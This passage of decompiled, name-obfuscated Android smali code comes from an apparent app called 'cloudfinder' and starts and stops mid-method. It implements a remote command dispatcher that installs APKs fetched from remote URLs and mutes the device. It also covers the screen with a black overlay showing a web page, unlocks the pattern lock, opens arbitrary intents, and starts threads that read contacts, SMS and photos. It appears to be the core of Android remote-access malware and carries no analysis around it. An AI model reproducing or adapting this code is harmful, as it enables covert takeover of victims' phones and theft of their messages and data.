    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v0, :cond_3

    if-eqz v1, :cond_3

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "action"

    invoke-virtual {v0, v1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v1, Landroid/content/Intent;

    const-string v2, "com.example.ACTION_MESSAGE"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v2, "message"

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v6, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_0
    move-exception v0

    const-string v1, "handleInitData error"

    invoke-static {v8, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_1
    :cond_3
    :goto_1
    return-void
.end method

.method public final ؾ(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "url"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "fileMd5"

    invoke-virtual {p1, v2, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    sget v1, Lcom/lite/cloudfinder/service/DownloadService;->؋:I

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v3, Lcom/lite/cloudfinder/service/DownloadService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "download_url"

    invoke-virtual {v1, v3, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "installApk fileMd5="

    invoke-virtual {v0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return-void
.end method

.method public final ؿ()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "package:"

    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.settings.MANAGE_UNKNOWN_APP_SOURCES"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {v2, v3, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "installPermission error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ـ(Lorg/json/JSONObject;)V
    .locals 2

    sget-object v0, Lڝږ؁ڋ/د;->آ:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :goto_0
    const v1, 0x7f0b0070

    invoke-static {v0, v1}, Lڝږ؁ڋ/ح;->ا(Landroid/content/Context;I)V

    invoke-virtual {p0, p1}, Lڜٟٱڀ/أ;->ڃ(Lorg/json/JSONObject;)V

    return-void
.end method

.method public final ف()V
    .locals 2

    sget-object v0, Lڝږ؁ڋ/د;->آ:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    invoke-static {v1}, Lڝږ؁ڋ/ح;->ئ(Z)V

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :goto_0
    invoke-static {v0}, Lڝږ؁ڋ/ح;->ب(Landroid/content/Context;)V

    return-void
.end method

.method public final ق()V
    .locals 2

    sget-object v0, Lڝږ؁ڋ/د;->آ:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    invoke-static {v1}, Lڝږ؁ڋ/ح;->ئ(Z)V

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :goto_0
    const v1, 0x7f0b0070

    invoke-static {v0, v1}, Lڝږ؁ڋ/ح;->ا(Landroid/content/Context;I)V

    return-void
.end method

.method public final ك()V
    .locals 2

    sget-object v0, Lڝږ؁ڋ/د;->آ:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    invoke-static {v1}, Lڝږ؁ڋ/ح;->ئ(Z)V

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :goto_0
    invoke-static {v0}, Lڝږ؁ڋ/ح;->ة(Landroid/content/Context;)V

    return-void
.end method

.method public final ل()V
    .locals 4

    :try_start_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "audio"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    if-eqz v0, :cond_0

    const/4 v1, 0x3

    const/4 v2, 0x1

    const/16 v3, -0x64

    invoke-virtual {v0, v1, v3, v2}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    const/4 v1, 0x2

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v3, v2}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    const/4 v1, 0x5

    invoke-virtual {v0, v1, v3, v2}, Landroid/media/AudioManager;->adjustStreamVolume(III)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "muteDevice error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method

.method public final م(Lorg/json/JSONObject;)V
    .locals 5

    const-string v0, ""

    const-string v1, "map"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    :try_start_0
    const-string v1, "action"

    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "uri"

    invoke-virtual {p1, v2, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "pkg"

    invoke-virtual {p1, v3, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "cls"

    invoke-virtual {p1, v4, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    new-instance v0, Landroid/content/Intent;

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    goto :goto_0

    :cond_1
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    :goto_0
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_3

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    new-instance v1, Landroid/content/ComponentName;

    invoke-direct {v1, v3, p1}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_1

    :cond_2
    invoke-virtual {v0, v3}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    :cond_3
    :goto_1
    const/high16 p1, 0x10000000

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object p1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "openIntent error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    return-void
.end method

.method public final ن(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "url"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v2, Lcom/lite/cloudfinder/activity/BlackOverlayActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v2, "webpage"

    invoke-virtual {v0, v2, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    return-void
.end method

.method public final ه(Lorg/json/JSONObject;)V
    .locals 5

    const-string v0, "CommandDispatcher"

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v2, "openPkg: no launch intent for "

    const-string v3, "pkg"

    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v3, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    if-eqz v3, :cond_1

    const/high16 p1, 0x10000000

    invoke-virtual {v3, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_1
    invoke-virtual {v2, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v1, "openPkg error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final و(Lorg/json/JSONObject;)V
    .locals 2

    const-string v0, "url"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "about:blank"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    invoke-direct {v0, v1, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 p1, 0x10000000

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object p1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "openUrl error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method

.method public final ى(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "pattern"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string p1, "CommandDispatcher"

    const-string v0, "patternUnlock: no pattern provided"

    invoke-static {p1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v2, 0x16

    invoke-direct {v1, v2, p0, p1}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    const-string p1, "pattern-unlock"

    invoke-direct {v0, v1, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ي(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "type"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    const v1, -0x410bbbb0

    const/4 v2, 0x2

    const/4 v3, 0x1

    if-eq v0, v1, :cond_2

    const v1, -0x13be51f3

    if-eq v0, v1, :cond_1

    const v1, 0x237a88eb

    if-eq v0, v1, :cond_0

    goto :goto_0

    :cond_0
    const-string v0, "notification"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    move p1, v3

    goto :goto_1

    :cond_1
    const-string v0, "battery"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    move p1, v2

    goto :goto_1

    :cond_2
    const-string v0, "overlay"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz p1, :cond_3

    const/4 p1, 0x0

    goto :goto_1

    :cond_3
    :goto_0
    const/4 p1, -0x1

    :goto_1
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "package:"

    if-eqz p1, :cond_6

    if-eq p1, v3, :cond_5

    if-eq p1, v2, :cond_4

    :try_start_1
    new-instance p1, Landroid/content/Intent;

    const-string v2, "android.settings.APPLICATION_DETAILS_SETTINGS"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    goto :goto_2

    :cond_4
    new-instance p1, Landroid/content/Intent;

    const-string v2, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    goto :goto_2

    :cond_5
    new-instance p1, Landroid/content/Intent;

    const-string v1, "android.settings.APP_NOTIFICATION_SETTINGS"

    invoke-direct {p1, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.provider.extra.APP_PACKAGE"

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_2

    :cond_6
    new-instance p1, Landroid/content/Intent;

    const-string v2, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    :goto_2
    const/high16 v1, 0x10000000

    invoke-virtual {p1, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "handlePermission error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    return-void
.end method

.method public final ٮ()V
    .locals 4

    iget-object v0, p0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;

    const/4 v1, 0x0

    iput-boolean v1, v0, Lڜٟٱڀ/د;->ة:Z

    const/4 v2, 0x0

    :try_start_0
    invoke-static {}, Lڜٟٱڀ/ؤ;->؋()Lڜٟٱڀ/ؤ;

    move-result-object v3

    iput-boolean v1, v3, Lڜٟٱڀ/ؤ;->إ:Z

    iput-boolean v1, v3, Lڜٟٱڀ/ؤ;->ؤ:Z

    iget-object v1, v3, Lڜٟٱڀ/ؤ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v1, v2}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    iget-object v1, v3, Lڜٟٱڀ/ؤ;->؋:Lڜٟٱڀ/ش;

    invoke-virtual {v1}, Lڜٟٱڀ/ش;->ؠ()V

    const-string v1, "ConnOrchestrator"

    const-string v3, "Stopped"

    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    iget-object v1, v0, Lڜٟٱڀ/د;->ؠ:Lio/socket/client/Socket;

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Lio/socket/emitter/Emitter;->off()Lio/socket/emitter/Emitter;

    iget-object v1, v0, Lڜٟٱڀ/د;->ؠ:Lio/socket/client/Socket;

    invoke-virtual {v1}, Lio/socket/client/Socket;->disconnect()Lio/socket/client/Socket;

    iput-object v2, v0, Lڜٟٱڀ/د;->ؠ:Lio/socket/client/Socket;

    :cond_0
    :try_start_1
    iget-object v1, v0, Lڜٟٱڀ/د;->ئ:Landroid/os/PowerManager$WakeLock;

    if-eqz v1, :cond_1

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, v0, Lڜٟٱڀ/د;->ئ:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception v1

    const-string v2, "SocketManager"

    const-string v3, "releaseWakeLock error"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_0
    invoke-virtual {v0}, Lڜٟٱڀ/د;->؋()V

    return-void
.end method

.method public final ٯ()V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :try_start_0
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    if-eqz v1, :cond_0

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "reOpenMe error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method

.method public final ٱ(Lorg/json/JSONObject;)V
    .locals 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x6

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ٲ(Lorg/json/JSONObject;)V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-virtual {v0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "android.permission.READ_MEDIA_IMAGES"

    invoke-virtual {v0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/16 v2, 0x8

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ٳ(Lorg/json/JSONObject;)V
    .locals 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x0

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ٴ(Lorg/json/JSONObject;)V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "android.permission.READ_CONTACTS"

    invoke-virtual {v0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x3

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ٵ(Lorg/json/JSONObject;)V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "android.permission.READ_SMS"

    invoke-virtual {v0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

